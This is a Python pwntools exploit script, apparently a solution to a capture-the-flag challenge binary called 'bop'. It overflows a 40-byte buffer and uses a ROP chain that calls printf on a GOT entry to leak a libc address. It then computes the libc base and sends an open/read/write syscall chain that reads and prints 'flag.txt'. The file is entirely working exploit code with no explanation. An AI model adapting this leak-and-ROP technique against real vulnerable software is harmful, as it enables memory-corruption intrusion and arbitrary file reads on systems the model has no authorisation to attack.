from pwn import *

io = process("./bop")
io = gdb.debug("./bop", 
'''
break *0x4012fd
continue
''')
context.log_level = 'debug' 
e = ELF('./bop')
libc = ELF('./libc.so.6')

pop_rdi = 0x00000000004013d3
ret = 0x000000000040101a
pop_rsi_r15 = 0x00000000004013d1
printf_plt = 0x00000000004010f0
gets_plt = 0x0000000000401100
printf_got = e.got['printf']
gets_got = e.got['gets']
main = 0x4012fd
bss = 0x0000000000404080 + 0x400

payload = b'a'*40
payload += p64(pop_rdi)
payload += p64(printf_got)
payload += p64(pop_rsi_r15)
payload += p64(printf_got)
payload += p64(printf_got)
payload += p64(printf_plt)
payload += p64(ret)
payload += p64(main)


io.recvuntil('? ')
io.sendline(payload)

printf_leak = io.recvuntil("D")[:-1]
printf_leak = printf_leak + b'\x00\x00'
printf_leak = hex(u64(printf_leak))
print("printf leak = ", printf_leak)

libc_base = int(printf_leak, 16) - 0x061c90
print("libc base = ", hex(libc_base))
syscall = libc_base + 0x00000000000630a9
pop_rax = libc_base + 0x0000000000036174
pop_rdx = libc_base + 0x0000000000142c92
mov = libc_base + 0x0000000000057b5a


payload = b'a' * 40
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi_r15)
payload += b'flag.txt'
payload += p64(0)
payload += p64(mov)

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(0x3)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(bss)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(200)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(bss)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(200)
payload += p64(syscall)


io.recvuntil('? ')  
io.sendline(payload)
io.interactive()